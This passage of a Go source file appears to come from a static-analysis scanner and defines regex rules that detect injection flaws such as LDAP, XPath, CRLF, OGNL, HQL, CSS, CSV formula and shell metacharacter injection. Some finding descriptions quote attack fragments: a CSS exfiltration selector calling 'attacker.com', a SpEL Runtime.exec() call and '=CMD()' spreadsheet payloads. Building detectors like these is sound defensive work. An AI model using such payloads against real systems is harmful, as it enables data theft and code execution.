package injection

import (
	"regexp"
	"strings"

	"github.com/turenlabs/batou/internal/rules"
)

// ---------------------------------------------------------------------------
// Compiled regex patterns for extended injection rules
// ---------------------------------------------------------------------------

// BATOU-INJ-010: LDAP injection via string concat (broader)
var (
	reLDAPConcatBroad = regexp.MustCompile(`(?i)(?:ldap_search|ldap_bind|ldap_read|ldap_list|ldap_mod|ldap\.search|ldap3\.Connection|LdapConnection|DirectorySearcher)\s*\(.*(?:\+\s*\w+|%[sv]|\.format\(|f["'])`)
	reLDAPFilterBuild = regexp.MustCompile(`(?i)(?:filter|search_filter|ldap_filter|query)\s*[:=]\s*["']\s*\(\s*(?:&|\|)?\s*\(\s*\w+\s*=\s*["']\s*\+`)
)

// BATOU-INJ-011: XPath injection via string concat (broader)
var (
	reXPathConcatBroad = regexp.MustCompile(`(?i)(?:xpath\.compile|XPathFactory|selectNodes|selectSingleNode|evaluate|querySelector|etree\.XPath|lxml\.etree)\s*\(.*(?:\+\s*\w+|%[sv]|\.format\(|f["'])`)
	reXPathVarEmbed    = regexp.MustCompile(`(?i)["'][^"']*(?://|/)\w+\s*\[.*=\s*["']\s*\+\s*\w+`)
)

// BATOU-INJ-012: Header injection / CRLF
var (
	reHeaderCRLFLiteral = regexp.MustCompile(`(?i)(?:\\r\\n|\\x0d\\x0a|%0d%0a|%0D%0A).*(?:\.setHeader|\.header|\.set|Header\(\)\.Set|add_header|header\()`)
	reHeaderUserInput   = regexp.MustCompile(`(?i)(?:\.setHeader|\.header|\.addHeader|\.set|Header\(\)\.Set|header\()\s*\([^)]*(?:\+\s*(?:req\.|request\.|params|query|body|\$_GET|\$_POST|\$_REQUEST)|\.format\(|f["'].*\{)`)
)

// BATOU-INJ-013: Log injection / log forging
var (
	reLogForging = regexp.MustCompile(`(?i)(?:log(?:ger)?\.(?:info|warn|error|debug|fatal|critical|warning|log)|console\.(?:log|warn|error|info)|logging\.(?:info|warn|error|debug|critical|warning))\s*\(.*(?:req\.|request\.|params|query|body|args|input|user_input|\$_GET|\$_POST|\$_REQUEST)`)
	reLogFString = regexp.MustCompile(`(?i)(?:log(?:ger)?\.(?:info|warn|error|debug|fatal|critical|warning|log))\s*\(\s*f["']`)
	reLogConcat  = regexp.MustCompile(`(?i)(?:log(?:ger)?\.(?:info|warn|error|debug|fatal|critical|warning|log)|console\.(?:log|warn|error|info))\s*\(\s*["'][^"']*["']\s*\+\s*(?:req\.|request\.|user|input|param|data)`)
)

// BATOU-INJ-014: Expression Language injection (Java)
var (
	reELInjection     = regexp.MustCompile(`(?i)(?:ExpressionFactory|ValueExpression|MethodExpression|ELProcessor)\s*\.(?:createValueExpression|createMethodExpression|eval|getValue|setValue)\s*\(.*(?:request\.getParameter|getHeader|getAttribute|\+)`)
	reSpELParse       = regexp.MustCompile(`(?i)(?:SpelExpressionParser|ExpressionParser)\s*(?:\(\))?\.parseExpression\s*\(\s*(?:request|param|input|data|user|\w+\s*\+)`)
)

// BATOU-INJ-015: OGNL injection (Java/Groovy)
var (
	reOGNLInject   = regexp.MustCompile(`(?i)(?:Ognl\.getValue|Ognl\.setValue|OgnlUtil\.getValue|OgnlUtil\.setValue|ognl\.Ognl)\s*\(.*(?:request|param|input|user|\+)`)
	reOGNLParse    = regexp.MustCompile(`(?i)(?:Ognl\.parseExpression|OgnlUtil\.compile|ActionContext)\s*\(.*(?:request|param|input|user|\+)`)
)

// BATOU-INJ-016: HQL/JPQL injection (Java)
var (
	reHQLConcat     = regexp.MustCompile(`(?i)(?:createQuery|createNativeQuery)\s*\(\s*["'](?:SELECT|FROM|DELETE|UPDATE|INSERT)\b[^"']*["']\s*\+`)
	reHQLFmt        = regexp.MustCompile(`(?i)(?:createQuery|createNativeQuery)\s*\(\s*String\.format\s*\(\s*["'](?:SELECT|FROM|DELETE|UPDATE|INSERT)\b`)
	reJPQLNamedVar  = regexp.MustCompile(`(?i)(?:createQuery|createNativeQuery)\s*\(\s*["'][^"']*\b(?:SELECT|FROM|DELETE|UPDATE|INSERT)\b[^"']*["']\s*\+\s*\w+`)
)

// BATOU-INJ-017: CSS injection
var (
	reCSSInjection     = regexp.MustCompile(`(?i)(?:style|css|stylesheet)\s*(?:\+?=|=)\s*(?:["'][^"']*["']\s*\+\s*(?:req\.|request\.|params|query|body|input|user)|f["'].*\{.*(?:req|request|params|query|body|input|user))`)
	reCSSExpression    = regexp.MustCompile(`(?i)expression\s*\(\s*(?:\w+\s*\+|req\.|request\.|params|query|body|input|user)`)
	reCSSStyleTag      = regexp.MustCompile(`(?i)<style[^>]*>.*(?:req\.|request\.|params|query|body|input|user)`)
)

// BATOU-INJ-018: Formula/CSV injection
var (
	reCSVFormulaPrefix = regexp.MustCompile(`(?i)(?:csv|excel|spreadsheet|export|download|report)\w*.*(?:=\s*["'][=+\-@]|["'][=+\-@].*\+\s*\w+)`)
	reFormulaWrite     = regexp.MustCompile(`(?i)(?:write|append|add)(?:Row|Cell|Field)?\s*\(.*(?:["'][=+\-@]|req\.|request\.|input|user|param|data)`)
	reCSVWriter        = regexp.MustCompile(`(?i)(?:csv\.writer|CSVWriter|writerow|write_csv|to_csv)\s*.*(?:req\.|request\.|input|user|param|data)`)
)

// BATOU-INJ-019: Email header injection
var (
	reEmailHeaderInj = regexp.MustCompile(`(?i)(?:mail|email|send_mail|sendmail|smtp)\s*\(.*(?:req\.|request\.|params|query|body|input|user|\$_GET|\$_POST|\$_REQUEST).*(?:subject|to|from|cc|bcc|reply)`)
	reEmailSubject   = regexp.MustCompile(`(?i)(?:subject|to|from|cc|bcc|reply[-_]?to)\s*[:=]\s*(?:req\.|request\.|params|query|body|input|user|\$_GET|\$_POST|\$_REQUEST)`)
	reEmailCRLF      = regexp.MustCompile(`(?i)(?:mail|email|send_mail|sendmail|smtp).*(?:\\r\\n|\\n|%0[aAdD])`)
)

// BATOU-INJ-020: XML injection via string concat
var (
	reXMLConcat   = regexp.MustCompile(`(?i)(?:xml|soap)\w*\s*(?:\+?=|=)\s*["']<[^"']*>\s*["']\s*\+\s*\w+`)
	reXMLFmt      = regexp.MustCompile(`(?i)(?:xml|soap)\w*\s*(?:\+?=|=)\s*(?:f["'].*<.*\{|["'].*<.*["']\s*%|String\.format\s*\(\s*["'].*<)`)
	reXMLTemplate = regexp.MustCompile("(?i)(?:xml|soap)\\w*\\s*(?:\\+?=|=)\\s*`[^`]*<[^`]*\\$\\{")
)

// BATOU-INJ-021: RegExp injection
var (
	reRegexNew      = regexp.MustCompile(`(?i)(?:new\s+RegExp|re\.compile|regexp\.Compile|regexp\.MustCompile|Pattern\.compile|Regex\.new|preg_match)\s*\(\s*(?:req\.|request\.|params|query|body|input|user|\w+\s*\+)`)
	reRegexVar      = regexp.MustCompile(`(?i)(?:new\s+RegExp|re\.compile|regexp\.Compile|Pattern\.compile|Regex\.new)\s*\(\s*[a-zA-Z_]\w*\s*[,)]`)
	reRegexUserCtx  = regexp.MustCompile(`(?i)(?:req\.|request\.|params|query|body|input|user|search|filter|pattern)`)
)

// BATOU-INJ-022: MongoDB operator injection
var (
	reMongoOperatorInj  = regexp.MustCompile(`(?i)(?:find|findOne|updateOne|updateMany|deleteOne|deleteMany|count|aggregate)\s*\(\s*\{[^}]*\$(?:gt|gte|lt|lte|ne|nin|in|regex|where|expr|or|and|not)\s*:`)
	reMongoReqDirect    = regexp.MustCompile(`(?i)(?:find|findOne|updateOne|updateMany|deleteOne|deleteMany)\s*\(\s*(?:req\.body|req\.query|req\.params|request\.json|request\.args|request\.form)`)
	reMongoNoSanitize   = regexp.MustCompile(`(?i)(?:mongo-sanitize|sanitize|express-mongo-sanitize|sanitizeInput|stripDollarSign)`)
)

// BATOU-INJ-023: SSTI via string concatenation
var (
	reSSTIConcat     = regexp.MustCompile(`(?i)(?:render_template_string|template\.render|Template|Jinja2|Environment)\s*\(\s*["'][^"']*["']\s*\+\s*(?:req\.|request\.|params|query|body|input|user|\$_GET|\$_POST)`)
	reSSTIFString    = regexp.MustCompile(`(?i)(?:render_template_string|Template)\s*\(\s*f["'].*\{.*(?:req|request|params|query|body|input|user)`)
	reSSTIEngine     = regexp.MustCompile(`(?i)(?:ejs\.render|pug\.render|nunjucks\.renderString|Handlebars\.compile|mustache\.render)\s*\(\s*(?:req\.|request\.|params|query|body|input|user|\w+\s*\+)`)
)

// BATOU-INJ-024: Shell metacharacter injection
var (
	reShellMeta     = regexp.MustCompile(`(?i)(?:exec|system|popen|spawn|shell_exec|passthru|proc_open|Runtime\.exec|ProcessBuilder|os\.system|subprocess)\s*\(.*(?:\||\$\(|` + "`" + `|;|&&|\|\||\$\{).*(?:req\.|request\.|params|query|body|input|user|\$_GET|\$_POST)`)
	reShellPipe     = regexp.MustCompile(`(?i)(?:exec|system|popen|shell_exec)\s*\(\s*["'][^"']*(?:\||;|&&)\s*["']\s*\.\s*\$`)
	reShellBacktick = regexp.MustCompile("(?i)(?:exec|system|popen|spawn)\\s*\\(.*`[^`]*\\$\\{.*(?:req|request|params|query|body|input|user)")
)

// ---------------------------------------------------------------------------
// Registration
// ---------------------------------------------------------------------------

func init() {
	rules.Register(&LDAPInjectionBroad{})
	rules.Register(&XPathInjectionBroad{})
	rules.Register(&CRLFInjection{})
	rules.Register(&LogInjection{})
	rules.Register(&ExpressionLangInjection{})
	rules.Register(&OGNLInjection{})
	rules.Register(&HQLInjection{})
	rules.Register(&CSSInjection{})
	rules.Register(&FormulaInjection{})
	rules.Register(&EmailHeaderInjection{})
	rules.Register(&XMLInjection{})
	rules.Register(&RegExpInjection{})
	rules.Register(&MongoOperatorInjection{})
	rules.Register(&SSTIConcat{})
	rules.Register(&ShellMetacharInjection{})
}

// ---------------------------------------------------------------------------
// BATOU-INJ-010: LDAP injection via string concat (broader)
// ---------------------------------------------------------------------------

type LDAPInjectionBroad struct{}

func (r *LDAPInjectionBroad) ID() string                     { return "BATOU-INJ-010" }
func (r *LDAPInjectionBroad) Name() string                   { return "LDAPInjectionBroad" }
func (r *LDAPInjectionBroad) DefaultSeverity() rules.Severity { return rules.High }
func (r *LDAPInjectionBroad) Description() string {
	return "Detects LDAP queries constructed via string concatenation or formatting across multiple languages and LDAP libraries."
}
func (r *LDAPInjectionBroad) Languages() []rules.Language {
	return []rules.Language{rules.LangGo, rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangCSharp, rules.LangRuby}
}

func (r *LDAPInjectionBroad) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reLDAPConcatBroad, reLDAPFilterBuild}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "LDAP injection via string concatenation",
					Description: "LDAP filter or query built with string concatenation/formatting. An attacker can inject LDAP filter operators to bypass authentication or extract data.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Use parameterized LDAP queries or properly escape special characters with ldap.EscapeFilter() (Go), ldap3.utils.escape_filter_chars() (Python), or similar.",
					CWEID:         "CWE-90",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "ldap"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-011: XPath injection via string concat (broader)
// ---------------------------------------------------------------------------

type XPathInjectionBroad struct{}

func (r *XPathInjectionBroad) ID() string                     { return "BATOU-INJ-011" }
func (r *XPathInjectionBroad) Name() string                   { return "XPathInjectionBroad" }
func (r *XPathInjectionBroad) DefaultSeverity() rules.Severity { return rules.High }
func (r *XPathInjectionBroad) Description() string {
	return "Detects XPath expressions constructed with string concatenation or variable interpolation across multiple languages."
}
func (r *XPathInjectionBroad) Languages() []rules.Language {
	return []rules.Language{rules.LangGo, rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangCSharp, rules.LangRuby}
}

func (r *XPathInjectionBroad) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reXPathConcatBroad, reXPathVarEmbed}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "XPath injection via string concatenation",
					Description: "XPath expression built with string concatenation allows attackers to modify query logic and access unauthorized XML data.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Use parameterized XPath queries or XPath variable resolution. Escape special characters (, ), =, and quotes in user input.",
					CWEID:         "CWE-643",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "xpath"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-012: Header injection / CRLF injection
// ---------------------------------------------------------------------------

type CRLFInjection struct{}

func (r *CRLFInjection) ID() string                     { return "BATOU-INJ-012" }
func (r *CRLFInjection) Name() string                   { return "CRLFInjection" }
func (r *CRLFInjection) DefaultSeverity() rules.Severity { return rules.High }
func (r *CRLFInjection) Description() string {
	return "Detects CRLF injection via user input in HTTP headers, enabling HTTP response splitting, header injection, and cache poisoning."
}
func (r *CRLFInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangGo, rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby}
}

func (r *CRLFInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reHeaderCRLFLiteral, reHeaderUserInput}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "CRLF injection in HTTP header",
					Description: "User-controlled input in HTTP headers can inject CRLF sequences to split the response, add arbitrary headers, or inject a response body for XSS.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Strip or reject \\r and \\n from all header values. Use framework header methods that auto-sanitize CRLF.",
					CWEID:         "CWE-113",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "crlf", "header"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-013: Log injection / log forging
// ---------------------------------------------------------------------------

type LogInjection struct{}

func (r *LogInjection) ID() string                     { return "BATOU-INJ-013" }
func (r *LogInjection) Name() string                   { return "LogInjection" }
func (r *LogInjection) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *LogInjection) Description() string {
	return "Detects user input directly included in log messages, enabling log injection (forged log entries) and potential log-based attacks (JNDI lookups in Log4j)."
}
func (r *LogInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangGo, rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby}
}

func (r *LogInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reLogForging, reLogFString, reLogConcat}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "Log injection: user input in log message",
					Description: "User-controlled input included directly in log messages allows log forging (fake log entries with \\n), log truncation, and in Java (Log4j) can trigger JNDI injection for remote code execution.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Sanitize user input before logging by removing or encoding newlines and control characters. Use structured logging (JSON) with parameterized messages.",
					CWEID:         "CWE-117",
					OWASPCategory: "A09:2021-Security Logging and Monitoring Failures",
					Language:      ctx.Language, Confidence: "medium",
					Tags: []string{"injection", "log", "forging"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-014: Expression Language injection (Java)
// ---------------------------------------------------------------------------

type ExpressionLangInjection struct{}

func (r *ExpressionLangInjection) ID() string                     { return "BATOU-INJ-014" }
func (r *ExpressionLangInjection) Name() string                   { return "ExpressionLangInjection" }
func (r *ExpressionLangInjection) DefaultSeverity() rules.Severity { return rules.High }
func (r *ExpressionLangInjection) Description() string {
	return "Detects Java Expression Language (EL) or Spring Expression Language (SpEL) evaluation with user input, enabling remote code execution."
}
func (r *ExpressionLangInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangJava}
}

func (r *ExpressionLangInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	if ctx.Language != rules.LangJava {
		return nil
	}
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reELInjection, reSpELParse}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "Expression Language injection (EL/SpEL) with user input",
					Description: "Java Expression Language or Spring SpEL evaluated with user-controlled input allows arbitrary method invocation, leading to remote code execution. SpEL: T(java.lang.Runtime).getRuntime().exec()",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Never evaluate user input as EL/SpEL expressions. Use SimpleEvaluationContext (SpEL) to restrict available types. Sanitize or reject expressions from user input.",
					CWEID:         "CWE-917",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "expression-language", "rce"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-015: OGNL injection (Java/Groovy)
// ---------------------------------------------------------------------------

type OGNLInjection struct{}

func (r *OGNLInjection) ID() string                     { return "BATOU-INJ-015" }
func (r *OGNLInjection) Name() string                   { return "OGNLInjection" }
func (r *OGNLInjection) DefaultSeverity() rules.Severity { return rules.Critical }
func (r *OGNLInjection) Description() string {
	return "Detects OGNL expression evaluation with user input, which allows remote code execution. OGNL injection was the attack vector for Struts2 CVE-2017-5638."
}
func (r *OGNLInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangJava, rules.LangGroovy}
}

func (r *OGNLInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reOGNLInject, reOGNLParse}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "OGNL injection with user input (critical RCE risk)",
					Description: "OGNL expressions evaluated with user-controlled input allow arbitrary Java code execution. This was the attack vector for Apache Struts2 vulnerabilities (CVE-2017-5638, CVE-2018-11776).",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Never evaluate user input as OGNL expressions. If using Struts2, upgrade to the latest patched version. Use allowlists for any dynamic expression evaluation.",
					CWEID:         "CWE-917",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "ognl", "rce", "struts"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-016: HQL/JPQL injection (Java)
// ---------------------------------------------------------------------------

type HQLInjection struct{}

func (r *HQLInjection) ID() string                     { return "BATOU-INJ-016" }
func (r *HQLInjection) Name() string                   { return "HQLInjection" }
func (r *HQLInjection) DefaultSeverity() rules.Severity { return rules.High }
func (r *HQLInjection) Description() string {
	return "Detects Hibernate HQL or JPA JPQL queries built with string concatenation, enabling query injection similar to SQL injection."
}
func (r *HQLInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangJava}
}

func (r *HQLInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	if ctx.Language != rules.LangJava {
		return nil
	}
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reHQLConcat, reHQLFmt, reJPQLNamedVar}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "HQL/JPQL injection via string concatenation",
					Description: "Hibernate HQL or JPA JPQL query built with string concatenation. An attacker can inject HQL/JPQL clauses to modify query logic, extract data, or cause denial of service.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Use JPA named parameters (e.g., query.setParameter(\"name\", value)) or Criteria API instead of string concatenation.",
					CWEID:         "CWE-89",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "hql", "jpql", "hibernate"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-017: CSS injection
// ---------------------------------------------------------------------------

type CSSInjection struct{}

func (r *CSSInjection) ID() string                     { return "BATOU-INJ-017" }
func (r *CSSInjection) Name() string                   { return "CSSInjection" }
func (r *CSSInjection) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *CSSInjection) Description() string {
	return "Detects user input embedded in CSS styles or style attributes, enabling CSS injection for data exfiltration and UI redressing."
}
func (r *CSSInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangJavaScript, rules.LangTypeScript, rules.LangPython, rules.LangJava, rules.LangPHP, rules.LangRuby}
}

func (r *CSSInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reCSSInjection, reCSSExpression, reCSSStyleTag}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "CSS injection: user input in style",
					Description: "User-controlled input in CSS can enable data exfiltration via CSS selectors (e.g., input[value^='a']{background:url(attacker.com/a)}), UI redressing, and in legacy browsers, JavaScript execution via CSS expressions.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Sanitize CSS values with allowlists (only known-safe property values). Never allow user input in CSS selectors or property names.",
					CWEID:         "CWE-79",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "medium",
					Tags: []string{"injection", "css"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-018: Formula/CSV injection
// ---------------------------------------------------------------------------

type FormulaInjection struct{}

func (r *FormulaInjection) ID() string                     { return "BATOU-INJ-018" }
func (r *FormulaInjection) Name() string                   { return "FormulaInjection" }
func (r *FormulaInjection) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *FormulaInjection) Description() string {
	return "Detects user input written to CSV/Excel exports that could contain formula injection payloads (=, +, -, @) triggering code execution when opened in spreadsheet applications."
}
func (r *FormulaInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby, rules.LangGo}
}

func (r *FormulaInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reCSVFormulaPrefix, reFormulaWrite, reCSVWriter}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "Formula/CSV injection in export",
					Description: "User input written to CSV/Excel files can contain formula payloads (=CMD(), +CMD(), -CMD(), @SUM()) that execute when opened in Excel or Google Sheets, enabling command execution on the user's machine.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Prefix cell values starting with =, +, -, or @ with a single quote ('). Alternatively, sanitize by removing or escaping these characters.",
					CWEID:         "CWE-1236",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "medium",
					Tags: []string{"injection", "csv", "formula"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-019: Email header injection
// ---------------------------------------------------------------------------

type EmailHeaderInjection struct{}

func (r *EmailHeaderInjection) ID() string                     { return "BATOU-INJ-019" }
func (r *EmailHeaderInjection) Name() string                   { return "EmailHeaderInjection" }
func (r *EmailHeaderInjection) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *EmailHeaderInjection) Description() string {
	return "Detects user input in email headers (To, From, Subject, CC, BCC), enabling email header injection to send spam or phishing emails through the application."
}
func (r *EmailHeaderInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby, rules.LangGo}
}

func (r *EmailHeaderInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reEmailHeaderInj, reEmailSubject, reEmailCRLF}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "Email header injection: user input in email headers",
					Description: "User-controlled input in email headers allows injection of additional headers via CRLF sequences. An attacker can add CC/BCC recipients, modify the sender, or inject arbitrary email content to send spam or phishing.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Validate email addresses strictly. Strip or reject newlines (\\r\\n) from all header values. Use a mail library that auto-sanitizes headers.",
					CWEID:         "CWE-93",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "medium",
					Tags: []string{"injection", "email", "header"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-020: XML injection via string concat
// ---------------------------------------------------------------------------

type XMLInjection struct{}

func (r *XMLInjection) ID() string                     { return "BATOU-INJ-020" }
func (r *XMLInjection) Name() string                   { return "XMLInjection" }
func (r *XMLInjection) DefaultSeverity() rules.Severity { return rules.High }
func (r *XMLInjection) Description() string {
	return "Detects XML content built with string concatenation or formatting, enabling XML injection to modify document structure, inject elements, or escalate to XXE."
}
func (r *XMLInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangGo, rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby, rules.LangCSharp}
}

func (r *XMLInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	pats := []*regexp.Regexp{reXMLConcat, reXMLFmt, reXMLTemplate}
	for i, line := range lines {
		if isCommentLine(line) {
			continue
		}
		for _, p := range pats {
			if loc := p.FindStringIndex(line); loc != nil {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:       "XML injection via string concatenation",
					Description: "XML documents built with string concatenation allow injection of XML elements, attributes, and potentially XXE payloads. An attacker can modify the document structure.",
					FilePath: ctx.FilePath, LineNumber: i + 1, MatchedText: truncate(line[loc[0]:loc[1]], 120),
					Suggestion:    "Use XML builder libraries (e.g., xml.etree in Python, encoding/xml in Go) that properly escape special characters. Never build XML via string concatenation.",
					CWEID:         "CWE-91",
					OWASPCategory: "A03:2021-Injection",
					Language:      ctx.Language, Confidence: "high",
					Tags: []string{"injection", "xml"},
				})
				break
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// BATOU-INJ-021: RegExp injection
// ---------------------------------------------------------------------------

type RegExpInjection struct{}

func (r *RegExpInjection) ID() string                     { return "BATOU-INJ-021" }
func (r *RegExpInjection) Name() string                   { return "RegExpInjection" }
func (r *RegExpInjection) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *RegExpInjection) Description() string {
	return "Detects user input passed to regular expression compilation, enabling ReDoS (Regular Expression Denial of Service) attacks via catastrophic backtracking patterns."
}
func (r *RegExpInjection) Languages() []rules.Language {
	return []rules.Language{rules.LangGo, rules.LangPython, rules.LangJavaScript, rules.LangTypeScript, rules.LangJava, rules.LangPHP, rules.LangRuby}
}

